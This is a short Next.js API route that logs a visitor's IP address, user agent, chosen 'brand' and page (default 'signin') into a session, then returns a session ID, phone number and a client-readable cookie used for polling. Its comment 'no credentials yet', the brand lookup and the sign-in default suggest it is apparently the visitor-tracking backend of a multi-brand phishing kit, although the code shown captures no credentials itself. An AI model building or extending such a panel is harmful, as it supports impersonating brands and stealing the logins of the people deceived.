import { NextRequest, NextResponse } from 'next/server';
import { getBrandById } from '@/config/brands.config';
import { upsertSession } from '@/lib/sessions';

interface VisitRequest {
  brand: string;
  page: string;
}

export async function POST(request: NextRequest) {
  try {
    const body: VisitRequest = await request.json();
    const { brand: brandId, page } = body;

    // Validate brand
    const brand = getBrandById(brandId);
    if (!brand) {
      return NextResponse.json(
        { error: 'Invalid brand' },
        { status: 400 }
      );
    }

    // Get client info
    const rawIp = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown';
    const { normalizeIp } = await import('@/lib/sessions');
    const clientIp = normalizeIp(rawIp);
    const userAgent = request.headers.get('user-agent') || 'unknown';

    // Track session (no credentials yet)
    const session = await upsertSession(
      clientIp,
      userAgent,
      brandId,
      page || 'signin',
      {}
    );

    const res = NextResponse.json({ success: true, sessionId: session?.id, phoneNumber: session?.phoneNumber || null });
    // Set a non-httpOnly cookie so the client can read the session id (for polling)
    res.cookies.set('session_id', session?.id || '', { path: '/', maxAge: 60 * 60 * 24 });
    return res;

  } catch (error) {
    console.error('Visit API error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
